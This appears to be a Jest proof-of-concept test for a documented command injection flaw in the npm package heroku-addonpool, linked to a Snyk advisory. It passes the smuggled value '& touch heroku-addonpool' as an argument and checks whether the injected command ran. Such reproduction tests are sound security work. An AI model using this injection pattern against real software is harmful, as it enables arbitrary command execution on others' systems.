//https://snyk.io/vuln/SNYK-JS-HEROKUADDONPOOL-564428
test("Command Injection in heroku-addonpool", async () => {
  expect.assertions(2);
  const Root = require("heroku-addonpool");
  const fs = require("fs");
  const path = "./heroku-addonpool";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let root = Root("sss", "& touch heroku-addonpool", {});
  // return root.setup().catch(err=>{
  //     console.log("err!");
  // }).finally(()=>{
  //         console.log("called!");
  //         file_exist = fs.existsSync(path);
  //         expect(file_exist).toBe(true);
  //         fs.unlink(path, function (err) {
  //         });
  //     });

  try {
    await root.setup();
  } catch (err) {
  } finally {
    console.log("called!");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
